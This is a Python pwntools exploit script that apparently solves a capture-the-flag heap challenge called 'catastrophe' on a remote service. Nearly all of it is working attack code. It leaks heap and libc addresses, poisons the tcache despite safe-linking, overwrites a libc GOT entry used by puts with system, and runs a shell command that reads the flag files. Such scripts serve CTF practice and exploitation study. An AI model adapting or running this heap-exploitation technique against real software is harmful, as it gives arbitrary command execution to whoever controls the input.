#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
#context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'

exe = ELF("./catastrophe")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget(libc.path, libc.address)

rop = ROP(exe)

if args.REMOTE:
  host, port = "mc.ax", "31273"
if args.DOCKER:
  host, port = "127.0.0.1", "5000"

if args.REMOTE or args.DOCKER:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef/gef.py
    gef config context.show_opcodes_size 9
    gef config context.libc_args True
    gef config context.libc_args_path  ~/gdb.plugins/gef-extras/glibc-function-args/
#    set debug-file-directory ~/gdb.plugins/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/.debug
    c
     ''')
  else:
    p = process([exe.path])

def alloc(idx,size,data):
  p.sendlineafter('> ', '1')
  p.sendlineafter('Index?\n', str(idx))
  p.sendlineafter('Size?\n', str(size))
  p.sendlineafter('content: ', data)

def free(idx):
  p.sendlineafter('> ', '2')
  p.sendlineafter('Index?\n', str(idx))

def view(idx):
  p.sendlineafter('> ', '3')
  p.sendlineafter('Index?\n', str(idx))


payload = ''
for i in range(9):
  payload += '1\n'+str(i)+'\n512\nA\n'

for i in range(8):
  payload += '2\n'+str(i)+'\n'
p.sendafter('> ', payload)

p.recv()
p.sendline('3')
p.sendlineafter('Index?\n', '0')

p.recvuntil(b'\x3e\x20',drop=True)
heap = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00')) << 12
print('heap = '+hex(heap))

view(7)
p.recv(2)
leak = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))
print('leak = '+hex(leak))
libc.address = leak - 0x219ce0
print('libc base = '+hex(libc.address))

free(8)

payload = ''
for i in range(10):
  payload += '1\n'+str(i)+'\n40\nB\n'

for i in range(7):
  payload += '2\n'+str(i)+'\n'
p.sendafter('> ', payload)
p.recv()

p.sendline('2')
p.sendlineafter('Index?\n', '7')
#free(7)
free(8)
free(7)


for i in range(7):
  alloc(0,0x28,'B')

alloc(0,0x28,p64((libc.address + 0x219090) ^ ((heap+0x1260)>>12)) + p64(heap+0x10))
alloc(1,0x28, '0')
alloc(2,0x28, 'cat flag*;echo PIPO\x00')
alloc(3,0x28,p64(libc.address+0x19f1c0)+ p64(libc.sym['system']))

p.clean(timeout=2)
# now puts , will call system , because we modify got entry callex by puts (strlen), so execute command in chunk 2
p.sendline('3')
p.clean()
p.sendline('2')
print(p.recvuntil('PIPO',drop=True))
p.close()


